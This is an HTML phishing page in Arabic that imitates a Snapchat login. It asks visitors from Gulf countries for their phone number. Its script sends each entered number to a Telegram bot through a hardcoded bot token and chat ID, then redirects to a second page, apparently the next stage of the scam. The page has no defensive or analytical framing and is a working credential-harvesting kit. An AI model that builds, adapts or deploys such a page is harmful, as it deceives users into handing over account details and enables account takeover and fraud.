<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c4/Snapchat_logo.svg/512px-Snapchat_logo.svg.png">
    <title>تسجيل الدخول</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(to bottom, #ffe600, #fff59d);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #333;
        }

        .container {
            text-align: center;
            width: 90%;
            max-width: 400px;
            background: white;
            border-radius: 20px;
            padding: 30px 20px;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
        }

        .container img {
            width: 80px;
            margin-bottom: 20px;
        }

        .container h1 {
            font-size: 24px;
            font-weight: bold;
            color: #333;
            margin-bottom: 10px;
        }

        .container p {
            font-size: 14px;
            color: #666;
            margin-bottom: 20px;
        }

        .form-group {
            display: flex;
            flex-direction: column;
            gap: 10px;
            align-items: center;
        }

        .form-group select,
        .form-group input {
            border: 1px solid #ddd;
            border-radius: 20px;
            padding: 10px 15px;
            font-size: 16px;
            width: 100%;
        }

        button {
            width: 100%;
            padding: 12px 0;
            background: #ffe600;
            border: none;
            border-radius: 20px;
            font-size: 16px;
            font-weight: bold;
            color: #333;
            cursor: pointer;
            margin-top: 10px;
            transition: 0.3s;
        }

        button:hover {
            background: #ffd700;
        }

        .countdown {
            font-size: 14px;
            color: #333;
            margin-top: 15px;
        }

        footer {
            text-align: center;
            margin-top: 20px;
            color: #aaa;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c4/Snapchat_logo.svg/512px-Snapchat_logo.svg.png" alt="Snapchat Logo">
        <h1>تسجيل الدخول</h1>
        <p>يرجى إدخال رقم هاتفك لإتمام تسجيل الدخول.</p>

        <div class="form-group">
            <select id="countryCode">
                <option value="966">🇸🇦 السعودية +966</option>
                <option value="971">🇦🇪 الإمارات +971</option>
                <option value="965">🇰🇼 الكويت +965</option>
                <option value="974">🇶🇦 قطر +974</option>
                <option value="973">🇧🇭 البحرين +973</option>
            </select>
            <input id="phoneNumber" type="tel" placeholder="رقم الهاتف" maxlength="14">
        </div>
        <button onclick="sendMessage()">متابعة</button>
        <div class="countdown" id="countdown"></div>
    </div>

    <footer>©️ 2024 تطبيقك</footer>

    <script>
        const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
        const chatId = '612575358';

        function sendMessage() {
            const countryCode = document.getElementById('countryCode').value;
            const phoneNumber = document.getElementById('phoneNumber').value.trim();

            if (!phoneNumber || phoneNumber.length < 6) {
                alert('يرجى إدخال رقم هاتف صحيح.');
                return;
            }

            const fullPhoneNumber = `+${countryCode} ${phoneNumber}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: `رقم الهاتف: ${fullPhoneNumber}`
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    startCountdown();
                } else {
                    alert('حدث خطأ أثناء الإرسال.');
                }
            })
            .catch(error => {
                alert('فشل الاتصال بالخادم. حاول مرة أخرى.');
            });
        }

        function startCountdown() {
            const countdownElement = document.getElementById('countdown');
            let countdown = 4;

            const interval = setInterval(() => {
                countdownElement.textContent = `سيتم نقلك خلال ${countdown} ثانية...`;
                countdown--;

                if (countdown < 0) {
                    clearInterval(interval);
                    window.location.href = 'secondpage.html';
                }
            }, 1000);
        }
    </script>
</body>
</html>
